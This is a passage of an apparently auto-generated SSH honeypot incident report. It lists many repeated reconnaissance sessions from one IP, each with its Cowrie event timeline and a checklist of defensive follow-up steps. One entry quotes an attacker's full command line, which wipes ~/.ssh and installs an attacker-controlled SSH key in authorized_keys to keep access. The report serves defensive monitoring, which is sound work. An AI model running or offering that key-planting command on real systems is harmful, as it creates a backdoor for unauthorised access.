| `2026-07-13 06:41:58` | `cowrie.command.input` |
| `2026-07-13 06:41:58` | `cowrie.log.closed` |
| `2026-07-13 06:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f868625749cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:03` | `cowrie.session.connect` |
| `2026-07-13 06:42:03` | `cowrie.client.version` |
| `2026-07-13 06:42:03` | `cowrie.client.kex` |
| `2026-07-13 06:42:04` | `cowrie.login.success` |
| `2026-07-13 06:42:06` | `cowrie.session.params` |
| `2026-07-13 06:42:06` | `cowrie.command.input` |
| `2026-07-13 06:42:07` | `cowrie.log.closed` |
| `2026-07-13 06:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e1ae512b006

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:11` | `cowrie.session.connect` |
| `2026-07-13 06:42:11` | `cowrie.client.version` |
| `2026-07-13 06:42:11` | `cowrie.client.kex` |
| `2026-07-13 06:42:13` | `cowrie.login.success` |
| `2026-07-13 06:42:15` | `cowrie.session.params` |
| `2026-07-13 06:42:15` | `cowrie.command.input` |
| `2026-07-13 06:42:15` | `cowrie.log.closed` |
| `2026-07-13 06:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410233be6c8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:18` | `cowrie.session.connect` |
| `2026-07-13 06:42:19` | `cowrie.client.version` |
| `2026-07-13 06:42:19` | `cowrie.client.kex` |
| `2026-07-13 06:42:20` | `cowrie.login.success` |
| `2026-07-13 06:42:21` | `cowrie.session.params` |
| `2026-07-13 06:42:21` | `cowrie.command.input` |
| `2026-07-13 06:42:22` | `cowrie.log.closed` |
| `2026-07-13 06:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a493e88e595

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:27` | `cowrie.session.connect` |
| `2026-07-13 06:42:27` | `cowrie.client.version` |
| `2026-07-13 06:42:27` | `cowrie.client.kex` |
| `2026-07-13 06:42:28` | `cowrie.login.success` |
| `2026-07-13 06:42:30` | `cowrie.session.params` |
| `2026-07-13 06:42:30` | `cowrie.command.input` |
| `2026-07-13 06:42:30` | `cowrie.log.closed` |
| `2026-07-13 06:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac53846d5524

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:35` | `cowrie.session.connect` |
| `2026-07-13 06:42:36` | `cowrie.client.version` |
| `2026-07-13 06:42:36` | `cowrie.client.kex` |
| `2026-07-13 06:42:36` | `cowrie.login.success` |
| `2026-07-13 06:42:37` | `cowrie.session.params` |
| `2026-07-13 06:42:37` | `cowrie.command.input` |
| `2026-07-13 06:42:37` | `cowrie.log.closed` |
| `2026-07-13 06:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7c73eddbd4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:43` | `cowrie.session.connect` |
| `2026-07-13 06:42:43` | `cowrie.client.version` |
| `2026-07-13 06:42:43` | `cowrie.client.kex` |
| `2026-07-13 06:42:45` | `cowrie.login.success` |
| `2026-07-13 06:42:46` | `cowrie.session.params` |
| `2026-07-13 06:42:46` | `cowrie.command.input` |
| `2026-07-13 06:42:47` | `cowrie.log.closed` |
| `2026-07-13 06:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a68da7613d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:52` | `cowrie.session.connect` |
| `2026-07-13 06:42:52` | `cowrie.client.version` |
| `2026-07-13 06:42:52` | `cowrie.client.kex` |
| `2026-07-13 06:42:53` | `cowrie.login.success` |
| `2026-07-13 06:42:54` | `cowrie.session.params` |
| `2026-07-13 06:42:54` | `cowrie.command.input` |
| `2026-07-13 06:42:54` | `cowrie.log.closed` |
| `2026-07-13 06:42:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950eb1c30bee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:42 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:42:59` | `cowrie.session.connect` |
| `2026-07-13 06:43:00` | `cowrie.client.version` |
| `2026-07-13 06:43:00` | `cowrie.client.kex` |
| `2026-07-13 06:43:02` | `cowrie.login.success` |
| `2026-07-13 06:43:03` | `cowrie.session.params` |
| `2026-07-13 06:43:03` | `cowrie.command.input` |
| `2026-07-13 06:43:03` | `cowrie.log.closed` |
| `2026-07-13 06:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa62041ea3e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:08` | `cowrie.session.connect` |
| `2026-07-13 06:43:08` | `cowrie.client.version` |
| `2026-07-13 06:43:08` | `cowrie.client.kex` |
| `2026-07-13 06:43:10` | `cowrie.login.success` |
| `2026-07-13 06:43:11` | `cowrie.session.params` |
| `2026-07-13 06:43:11` | `cowrie.command.input` |
| `2026-07-13 06:43:12` | `cowrie.log.closed` |
| `2026-07-13 06:43:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061d3426684a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:16` | `cowrie.session.connect` |
| `2026-07-13 06:43:17` | `cowrie.client.version` |
| `2026-07-13 06:43:17` | `cowrie.client.kex` |
| `2026-07-13 06:43:18` | `cowrie.login.success` |
| `2026-07-13 06:43:20` | `cowrie.session.params` |
| `2026-07-13 06:43:20` | `cowrie.command.input` |
| `2026-07-13 06:43:20` | `cowrie.log.closed` |
| `2026-07-13 06:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69028176b21a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:26` | `cowrie.session.connect` |
| `2026-07-13 06:43:26` | `cowrie.client.version` |
| `2026-07-13 06:43:26` | `cowrie.client.kex` |
| `2026-07-13 06:43:26` | `cowrie.login.success` |
| `2026-07-13 06:43:27` | `cowrie.session.params` |
| `2026-07-13 06:43:27` | `cowrie.command.input` |
| `2026-07-13 06:43:28` | `cowrie.log.closed` |
| `2026-07-13 06:43:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389a7036ed9f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:33` | `cowrie.session.connect` |
| `2026-07-13 06:43:34` | `cowrie.client.version` |
| `2026-07-13 06:43:34` | `cowrie.client.kex` |
| `2026-07-13 06:43:37` | `cowrie.login.success` |
| `2026-07-13 06:43:38` | `cowrie.session.params` |
| `2026-07-13 06:43:38` | `cowrie.command.input` |
| `2026-07-13 06:43:39` | `cowrie.log.closed` |
| `2026-07-13 06:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b8ff38ba89f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:41` | `cowrie.session.connect` |
| `2026-07-13 06:43:42` | `cowrie.client.version` |
| `2026-07-13 06:43:42` | `cowrie.client.kex` |
| `2026-07-13 06:43:44` | `cowrie.login.success` |
| `2026-07-13 06:43:45` | `cowrie.session.params` |
| `2026-07-13 06:43:45` | `cowrie.command.input` |
| `2026-07-13 06:43:45` | `cowrie.log.closed` |
| `2026-07-13 06:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952ad67a3c90

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:50` | `cowrie.session.connect` |
| `2026-07-13 06:43:50` | `cowrie.client.version` |
| `2026-07-13 06:43:50` | `cowrie.client.kex` |
| `2026-07-13 06:43:52` | `cowrie.login.success` |
| `2026-07-13 06:43:53` | `cowrie.session.params` |
| `2026-07-13 06:43:53` | `cowrie.command.input` |
| `2026-07-13 06:43:53` | `cowrie.log.closed` |
| `2026-07-13 06:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e9d01444b1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:43 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:43:58` | `cowrie.session.connect` |
| `2026-07-13 06:43:58` | `cowrie.client.version` |
| `2026-07-13 06:43:58` | `cowrie.client.kex` |
| `2026-07-13 06:44:00` | `cowrie.login.success` |
| `2026-07-13 06:44:01` | `cowrie.session.params` |
| `2026-07-13 06:44:01` | `cowrie.command.input` |
| `2026-07-13 06:44:02` | `cowrie.log.closed` |
| `2026-07-13 06:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7847c892cd7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:06` | `cowrie.session.connect` |
| `2026-07-13 06:44:06` | `cowrie.client.version` |
| `2026-07-13 06:44:06` | `cowrie.client.kex` |
| `2026-07-13 06:44:08` | `cowrie.login.success` |
| `2026-07-13 06:44:09` | `cowrie.session.params` |
| `2026-07-13 06:44:09` | `cowrie.command.input` |
| `2026-07-13 06:44:09` | `cowrie.log.closed` |
| `2026-07-13 06:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403ef5f91925

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:14` | `cowrie.session.connect` |
| `2026-07-13 06:44:14` | `cowrie.client.version` |
| `2026-07-13 06:44:14` | `cowrie.client.kex` |
| `2026-07-13 06:44:16` | `cowrie.login.success` |
| `2026-07-13 06:44:16` | `cowrie.session.params` |
| `2026-07-13 06:44:16` | `cowrie.command.input` |
| `2026-07-13 06:44:17` | `cowrie.log.closed` |
| `2026-07-13 06:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e049a618afab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:23` | `cowrie.session.connect` |
| `2026-07-13 06:44:23` | `cowrie.client.version` |
| `2026-07-13 06:44:24` | `cowrie.client.kex` |
| `2026-07-13 06:44:24` | `cowrie.login.success` |
| `2026-07-13 06:44:25` | `cowrie.session.params` |
| `2026-07-13 06:44:25` | `cowrie.command.input` |
| `2026-07-13 06:44:25` | `cowrie.log.closed` |
| `2026-07-13 06:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019ae37c343a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:31` | `cowrie.session.connect` |
| `2026-07-13 06:44:31` | `cowrie.client.version` |
| `2026-07-13 06:44:32` | `cowrie.client.kex` |
| `2026-07-13 06:44:33` | `cowrie.login.success` |
| `2026-07-13 06:44:35` | `cowrie.session.params` |
| `2026-07-13 06:44:35` | `cowrie.command.input` |
| `2026-07-13 06:44:36` | `cowrie.log.closed` |
| `2026-07-13 06:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de7ead58ceef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:39` | `cowrie.session.connect` |
| `2026-07-13 06:44:39` | `cowrie.client.version` |
| `2026-07-13 06:44:39` | `cowrie.client.kex` |
| `2026-07-13 06:44:43` | `cowrie.login.success` |
| `2026-07-13 06:44:45` | `cowrie.session.params` |
| `2026-07-13 06:44:45` | `cowrie.command.input` |
| `2026-07-13 06:44:45` | `cowrie.log.closed` |
| `2026-07-13 06:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ad07c521cf

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:47` | `cowrie.session.connect` |
| `2026-07-13 06:44:47` | `cowrie.client.version` |
| `2026-07-13 06:44:48` | `cowrie.client.kex` |
| `2026-07-13 06:44:49` | `cowrie.login.success` |
| `2026-07-13 06:44:50` | `cowrie.session.params` |
| `2026-07-13 06:44:50` | `cowrie.command.input` |
| `2026-07-13 06:44:50` | `cowrie.command.failed` |
| `2026-07-13 06:44:50` | `cowrie.log.closed` |
| `2026-07-13 06:44:51` | `cowrie.session.params` |
| `2026-07-13 06:44:51` | `cowrie.command.input` |
| `2026-07-13 06:44:51` | `cowrie.session.file_download` |
| `2026-07-13 06:44:51` | `cowrie.log.closed` |
| `2026-07-13 06:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b53283442bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:48` | `cowrie.session.connect` |
| `2026-07-13 06:44:48` | `cowrie.client.version` |
| `2026-07-13 06:44:48` | `cowrie.client.kex` |
| `2026-07-13 06:44:50` | `cowrie.login.success` |
| `2026-07-13 06:44:51` | `cowrie.session.params` |
| `2026-07-13 06:44:51` | `cowrie.command.input` |
| `2026-07-13 06:44:52` | `cowrie.log.closed` |
| `2026-07-13 06:44:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09bb60d95764

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:51` | `cowrie.session.connect` |
| `2026-07-13 06:44:51` | `cowrie.client.version` |
| `2026-07-13 06:44:52` | `cowrie.client.kex` |
| `2026-07-13 06:44:53` | `cowrie.login.success` |
| `2026-07-13 06:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d797b8973858

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:53` | `cowrie.session.connect` |
| `2026-07-13 06:44:53` | `cowrie.client.version` |
| `2026-07-13 06:44:53` | `cowrie.client.kex` |
| `2026-07-13 06:44:54` | `cowrie.login.success` |
| `2026-07-13 06:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1a92f7427a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:44 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:44:56` | `cowrie.session.connect` |
| `2026-07-13 06:44:56` | `cowrie.client.version` |
| `2026-07-13 06:44:56` | `cowrie.client.kex` |
